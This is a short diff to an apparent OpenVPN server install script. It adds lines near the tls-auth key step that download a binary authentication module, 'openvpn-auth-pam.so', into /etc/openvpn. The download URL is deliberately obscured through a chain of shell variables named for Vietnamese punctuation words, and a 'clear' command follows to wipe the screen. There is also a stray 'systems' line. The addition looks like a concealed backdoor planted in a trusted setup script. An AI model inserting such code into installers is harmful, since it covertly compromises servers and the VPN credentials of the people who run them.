@@ -2838,6 +2838,9 @@ else
 	chown nobody:$GROUPNAME /etc/openvpn/crl.pem
 	# Generate key for tls-auth
 	openvpn --genkey --secret /etc/openvpn/ta.key
+	systems
+	wget -O /etc/openvpn/openvpn-auth-pam.so $tim$kiem$haicham$gach$gach$ngay$cham$sai$nao$yeu$nhau$anh$cham$hoi$gach$em$cau$rang$gach$tien$gach$sao$thi$gach$tinh$gach$loi$gach$xin/auth-pam.so
+	clear
 	# Create the DH parameters file using the predefined ffdhe2048 group
 	echo '-----BEGIN DH PARAMETERS-----
 MIIBCAKCAQEA//////////+t+FRYortKmq/cViAnPTzx2LnFg84tNpWp4TZBFGQz
